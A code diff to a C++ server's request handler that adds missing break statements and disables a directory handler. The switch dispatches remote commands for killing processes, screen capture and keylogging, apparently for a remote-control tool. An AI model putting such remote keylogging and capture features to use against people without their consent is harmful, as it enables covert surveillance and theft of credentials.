@@ -23,8 +23,8 @@ void ServerBackend::handleClientRequest(std::shared_ptr<DataObj> data)
             std::string appName = data->getData_String();
             data = _IAPfunc.stopApp(appName);
         }
-
-    case RPC: 
+        break;
+    case RPC:
         if (data->getCmdType() == SHOW)
         {
             data = _RPCfunc.listPrcs();
@@ -39,7 +39,8 @@ void ServerBackend::handleClientRequest(std::shared_ptr<DataObj> data)
             std::string prcName = data->getData_String();
             data = _RPCfunc.killPrc(prcName);
         }
-    case SCR: 
+        break;
+    case SCR:
         if (data->getCmdType() == START)
         {
             data = _SCRfunc.startCapture();
@@ -48,7 +49,8 @@ void ServerBackend::handleClientRequest(std::shared_ptr<DataObj> data)
         {
             data = _SCRfunc.stopCapture();
         }
-    case KLG: 
+        break;
+    case KLG:
         if (data->getCmdType() == START)
         {
             data = _KLGfunc.startKeylog();
@@ -57,10 +59,14 @@ void ServerBackend::handleClientRequest(std::shared_ptr<DataObj> data)
         {
             data = _KLGfunc.stopKeylog();
         }
+        break;
     case DIR:
-        data = _DIRfunc.HandleRequest();
-    }
+        //data = _DIRfunc.HandleRequest();
+        break;
 
+    default:
+        break;
+    }
 }
 /*
 DataObj ServerBackend::deserialize(std::string& data)
